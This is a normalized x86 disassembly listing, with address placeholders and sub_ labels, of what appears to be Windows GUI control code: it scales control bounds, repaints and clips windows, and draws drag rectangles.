je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
mov edx esi
mov eax ebx
call sub_45dac4
sub_442758
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebx + 0xa0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ rw-data ] 0x0
jne r-xdata
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov [ ebp - 0x10 ] edi
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx ebx
mov edx 0xb042
mov eax esi
call sub_443d6c
sub_4427d4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov edi edx
mov esi eax
cmp edi [ esp ]
je r-xdata
mov al [ r-xdata ]
mov [ esi + 0x98 ] al
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
je r-xdata
mov bl [ r-xdata ]
mov bl [ esi + 0x98 ]
jmp r-xdata
mov ebp [ esi + 0x40 ]
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
push eax
call MulDiv
mov ebp eax
jmp r-xdata
test bl 0x1
je r-xdata
mov eax [ esi + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call MulDiv
mov [ esp + 0x4 ] eax
jmp r-xdata
test bl 0x2
je r-xdata
mov eax [ esi + 0x48 ]
mov [ esp + 0x8 ] eax
test [ esi + 0x51 ] 0x1
jne r-xdata
test bl 0x4
je r-xdata
mov eax [ esi + 0x4c ]
mov [ esp + 0xc ] eax
test [ esi + 0x51 ] 0x2
jne r-xdata
test bl 0x1
je r-xdata
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x90 ]
push eax
call MulDiv
mov [ esi + 0x90 ] eax
test bl 0x8
setne dl
test al al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x48 ]
push eax
call MulDiv
mov [ esp + 0x8 ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
add eax [ esi + 0x48 ]
push eax
call MulDiv
sub eax ebp
mov [ esp + 0x8 ] eax
jmp r-xdata
cmp [ esi + 0x59 ] 0x0
jne r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x94 ]
push eax
call MulDiv
mov [ esi + 0x94 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call MulDiv
mov [ esp + 0xc ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
add eax [ esi + 0x4c ]
push eax
call MulDiv
sub eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
test bl 0x8
setne al
test al al
je r-xdata
test bl 0x10
je r-xdata
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x10 ]
push eax
mov ecx [ esp + 0xc ]
mov edx ebp
mov eax esi
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov ebx [ esi + 0x68 ]
mov eax ebx
call sub_423d28
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_423d44
sub_4429a0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_442a36
push [ fs : eax ]
mov [ fs : eax ] esp
test [ edi + 0x50 ] 0x20
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_420c6c
test bl bl
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_442bb8
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x8 ]
call sub_404414
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442a3d
lea eax [ ebp - 0x8 ]
call sub_404008
retn
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_442be8
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
mov bl 0x1
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
test [ esi + 0x1c ] 0x1
je r-xdata
sub_442a44
push ebx
push esi
push edi
add esp 0xffffffe8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x48 ]
sub eax [ esp + 0x10 ]
add eax [ esp ]
push eax
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x18 ]
add eax [ esp + 0x8 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x84 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
sub_442a8c
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
jne r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
call sub_4039c0
test esi esi
je r-xdata
mov edx ebx
call sub_446018
mov edx ebx
mov eax esi
call sub_445f44
mov eax ebx
call sub_44220c
sub_442ad8
push ebx
push esi
push edi
mov ebx edx
mov edi eax
cmp bl [ edi + 0x57 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
mov si 0xffcd
call sub_403430
mov [ edi + 0x57 ] bl
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb00b
mov eax edi
call sub_443d6c
mov eax edi
mov si 0xffd0
call sub_403430
sub_442b70
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x7c ] esi
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_456998
mov edx ebx
mov eax esi
call sub_4207e4
sub_442b94
push ebx
mov ebx eax
push edx
xor ecx ecx
mov eax ebx
mov edx 0xc
call sub_443d6c
push 0x0
xor ecx ecx
mov edx 0xb012
mov eax ebx
call sub_443d6c
pop ebx
retn
sub_442bb8
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_442b2c
mov ebx eax
mov eax edi
mov ecx ebx
xor edx edx
call sub_4040f8
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
lea ecx [ ebx + 0x1 ]
mov edx [ edi ]
mov eax esi
call sub_442b3c
sub_442be8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_442c3d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_442bb8
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_404414
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442c44
lea eax [ ebp - 0x4 ]
call sub_404008
retn
mov eax esi
call sub_4044c8
mov edx eax
mov eax ebx
call sub_442b94
sub_442c68
push ebx
mov ebx eax
mov [ ebx + 0x59 ] 0x0
mov [ ebx + 0x56 ] 0x0
mov eax [ ebx + 0x68 ]
call sub_423c84
cmp eax [ ebx + 0x84 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb00e
mov eax ebx
call sub_443d6c
pop ebx
retn
or [ ebx + 0x98 ] 0x10
mov eax [ ebx + 0x68 ]
call sub_423c84
mov [ ebx + 0x84 ] eax
sub_442df0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_442de0
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor eax eax
call sub_43fd88
mov eax esi
call sub_43fd88
jmp r-xdata
sub_442e28
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x198 ]
mov edx ebx
call sub_41a4c4
test eax eax
jl r-xdata
mov edx [ ebx + 0x30 ]
mov edi [ edx + 0x198 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_41a358
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x198 ]
mov ecx ebx
mov edx esi
call sub_41a4e4
mov cl 0x1
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_443000
mov eax ebx
call sub_459a14
test [ eax + 0x54 ] 0x4
je r-xdata
mov dl 0x1
mov si 0xffd1
call sub_403430
sub_442ea8
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
retn
test dl dl
je r-xdata
xor edx edx
call sub_442e28
mov edx [ ecx + 0x198 ]
mov edx [ edx + 0x8 ]
dec edx
call sub_442e28
jmp r-xdata
sub_442ecc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_442f62
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
push 0x0
mov eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x40 ]
push eax
push esi
call SetViewportOrgEx
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442f69
lea eax [ ebp - 0xc ]
call sub_404008
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba04
call sub_4039c0
sub_442f74
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov edi [ eax + 0x198 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax edi
call sub_41a4c4
mov esi eax
test esi esi
jle r-xdata
mov [ ebp - 0x1 ] 0x0
dec esi
mov edx esi
mov eax edi
call sub_41a468
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test esi esi
jg r-xdata
test [ ebx + 0x50 ] 0x40
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_442558
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call IntersectRect
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call EqualRect
test eax eax
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_443000
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x15 ] cl
mov ebx edx
mov [ ebp - 0x4 ] eax
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4496dc
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_442558
cmp [ ebp - 0x15 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test [ eax + 0x50 ] 0x40
jne r-xdata
neg al
sbb eax eax
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4493d8
push eax
call InvalidateRect
push ebp
call sub_442f74
pop ecx
test al al
je r-xdata
mov al 0x1
sub_44309c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_4599ec
mov esi eax
test esi esi
je r-xdata
mov eax [ edi + 0x8 ]
push eax
mov ecx [ edi + 0x4 ]
mov edx 0xb043
mov eax ebx
call sub_443d6c
mov [ edi + 0xc ] eax
cmp ebx esi
je r-xdata
mov edx edi
mov eax esi
mov si 0xffc9
call sub_403430
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_443100
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4496dc
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x50 ] 0x40
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4493d8
push eax
call GetDC
mov [ ebp - 0x8 ] eax
xor ecx ecx
push ebp
push sub_4431d9
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x44 ]
mov ecx edx
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x4c ]
push ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov ecx eax
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x48 ]
push ecx
push edx
push eax
mov eax [ ebp - 0x8 ]
push eax
call IntersectClipRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_4471ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4493d8
push eax
call ReleaseDC
retn
sub_443260
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx edx
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov eax edi
call sub_443da0
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi + 0x9b ] 0x1
je r-xdata
xor eax eax
mov [ rw-data ] eax
test [ edi + 0x54 ] 0x1
je r-xdata
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
call sub_4039c0
test esi esi
jge r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_4426fc
mov eax [ esp + 0x8 ]
mov [ esp ] eax
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406dec
push eax
xor ecx ecx
mov edx 0x202
mov eax edi
call sub_443d6c
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x8 ]
mov ecx esi
mov edx ebx
mov eax edi
call sub_440f08
sub_443334
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] 0x0
cmp [ eax + 0xf2 ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0xc
mov [ esi ] 0x1
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
push esi
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xf4 ]
call [ ebx + 0xf0 ]
sub_443370
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xea ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_4433bc
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x11a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
sub_4433e8
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx edx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_442b5c
mov edi eax
mov eax [ ebx + 0x38 ]
call sub_442b48
mov ebp eax
mov [ esp + 0x10 ] edi
fild [ esp + 0x10 ]
fmul [ ebx + 0x20 ]
fild [ ebx + 0xc ]
fsubrp st1
fstp [ esp ]
fwait
mov [ esp + 0x10 ] ebp
fild [ esp + 0x10 ]
fmul [ ebx + 0x28 ]
fild [ ebx + 0x10 ]
fsubrp st1
fstp [ esp + 0x8 ]
fwait
lea esi [ ebx + 0x44 ]
fld [ esp ]
call sub_4029fc
mov [ esi ] eax
fld [ esp + 0x8 ]
call sub_4029fc
mov [ esi + 0x4 ] eax
add edi [ esi ]
mov [ esi + 0x8 ] edi
add ebp [ esi + 0x4 ]
mov [ esi + 0xc ] ebp
lea edx [ ebx + 0x44 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
jne r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x4 ]
call sub_4493d8
push eax
call GetWindowRect
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov dl [ ebx + 0x54 ]
push edx
lea edx [ ebx + 0x44 ]
push edx
mov eax [ eax + 0x17c ]
mov ecx [ ebx + 0x58 ]
mov edx [ ebx + 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
sub_4434cc
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x10a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
sub_443518
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov [ ebp - 0xa ] 0x0
cmp [ ebx + 0x13a ] 0x0
je r-xdata
cmp [ ebp - 0xa ] 0x0
jne r-xdata
push esi
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0xa ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
mov al [ ebp - 0xa ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx + 0xa4 ] esi
jmp r-xdata
mov ecx [ ebx + 0xa4 ]
mov eax ecx
cdq
xor eax edx
sub eax edx
cmp eax 0x78
jge r-xdata
test ecx ecx
setl al
mov ecx eax
mov eax [ ebx + 0xa4 ]
cdq
xor eax edx
sub eax edx
mov esi eax
sub esi 0x78
mov [ ebx + 0xa4 ] esi
test cl cl
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe0
call sub_403430
mov [ ebp - 0xa ] al
test esi esi
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe1
call sub_403430
mov [ ebp - 0xa ] al
jmp r-xdata
neg esi
mov [ ebx + 0xa4 ] esi
sub_4435dc
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x142 ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x144 ]
call [ ebx + 0x140 ]
sub_443628
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x14a ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x14c ]
call [ ebx + 0x148 ]
sub_443674
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
mov ebx eax
cmp [ ebp - 0x1 ] 0x0
je r-xdata
push esi
add esi 0x44
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
add esi 0x5c
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
jmp r-xdata
call GetDesktopWindow
mov [ ebp - 0x8 ] eax
push 0x402
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call GetDCEx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44378f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x40 ]
call sub_4242a4
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
mov esi [ ebp - 0x20 ]
sub eax esi
sub eax ebx
push eax
mov edi [ ebp - 0x1c ]
push edi
mov eax esi
add eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax edi
sub eax ebx
push eax
push ebx
mov eax edi
add eax ebx
push eax
mov eax [ ebp - 0x18 ]
sub eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
sub eax ebx
push eax
mov eax [ ebp - 0x14 ]
sub eax ebx
push eax
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
sub eax ebx
push eax
push ebx
push edi
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443796
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call ReleaseDC
retn
sub_4437c8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov edi edx
mov [ esp ] eax
mov ebp [ edi + 0x8 ]
mov esi [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x5 ]
mov edx ebp
mov eax [ esp ]
call sub_4426fc
mov al [ edi + 0x4 ]
sub al 0x3
jb r-xdata
test bl bl
jne r-xdata
mov [ esp + 0x4 ] 0x1
test bl bl
je r-xdata
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
mov esi [ eax + 0x38 ]
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ esp + 0xc ]
mov si 0xffde
call sub_403430
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffc4
call sub_403430
jmp r-xdata
test bl bl
je r-xdata
jmp r-xdata
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al [ esp + 0x4 ]
mov [ edi + 0xc ] eax
jmp r-xdata
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ esp + 0x4 ]
mov si 0xffcb
call sub_403430
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffb7
call sub_403430
jmp r-xdata
sub_4438b8
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
test edi edi
je r-xdata
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
cmp edi 0xffffffff
jne r-xdata
lea ecx [ ebp - 0x24 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_41900c
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax ebx
call sub_443da0
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax ebx
call sub_442b48
push eax
lea eax [ ebp - 0x34 ]
push eax
mov eax ebx
call sub_442b5c
mov ecx eax
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x1c ]
call sub_41905c
lea esi [ ebp - 0x34 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_443a98
mov [ ebp - 0x5 ] al
jmp r-xdata
lea ecx [ ebp - 0x24 ]
lea edx [ ebp - 0x1c ]
mov eax esi
call sub_4426d0
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebx + 0xa0 ]
mov ecx ebx
mov edx edi
mov si 0xffbe
call sub_403430
test al al
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0x1c ]
mov eax [ eax + 0x17c ]
mov edx ebx
mov esi [ eax ]
call [ esi + 0x14 ]
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0xa0 ]
call sub_4493d8
push eax
call MapWindowPoints
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4402cc
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_443a83
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
xor esi esi
call sub_4493d8
mov esi eax
jmp r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov [ eax + 0x4 ] edi
mov eax [ ebp - 0xc ]
mov dl [ ebp + 0x8 ]
mov [ eax + 0x54 ] dl
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x58 ] edx
mov eax [ ebp - 0xc ]
push edi
lea edi [ eax + 0x44 ]
lea esi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
push 0x1
